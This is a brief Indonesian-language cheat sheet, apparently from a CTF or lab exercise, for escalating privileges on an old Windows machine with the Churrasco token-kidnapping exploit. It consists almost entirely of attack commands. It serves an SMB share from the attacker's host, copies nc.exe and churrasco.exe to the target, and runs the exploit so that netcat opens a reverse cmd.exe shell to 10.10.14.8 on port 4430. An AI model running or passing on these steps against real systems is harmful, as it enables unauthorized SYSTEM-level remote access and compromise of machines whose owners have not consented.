# juicy potato on old windows system

download smbserver.py disini https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py

lalu jalankan pada directory yang ingin di share

    sudo python3 smbserver.py share .   

# copy nc from boxe

download nc.exe disini: https://github.com/int0x33/nc.exe/blob/master/nc.exe

    copy \\10.10.14.8\share\nc.exe

# copy exploit 

download exploit binary disini: https://github.com/Re4son/Churrasco/blob/master/churrasco.exe

    copy \\10.10.14.8\share\churrasco.exe

# run exploit

jangan lupa jalankan nc pada port 4430

    .\churrasco.exe -d "C:\\wmpub\arsalan\nc.exe -e cmd.exe 10.10.14.8 4430"


